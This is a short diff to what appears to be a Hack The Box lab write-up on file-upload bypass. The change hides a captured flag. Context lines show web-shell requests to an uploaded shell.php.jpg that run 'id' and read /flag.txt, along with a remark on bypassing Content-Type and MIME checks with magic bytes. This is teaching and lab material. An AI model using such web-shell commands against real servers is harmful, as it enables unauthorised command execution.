@@ -152,7 +152,7 @@ http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=id
 
 # Read flag
 http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=cat /flag.txt
-# Flag: HTB{c0mb1n3d_4tt4ck5_4r3_d34dly}
+# Flag: HTB{...}
 ```
 
 This comprehensive guide demonstrates how Content-Type and MIME-Type validation can be bypassed using header manipulation and magic bytes injection.
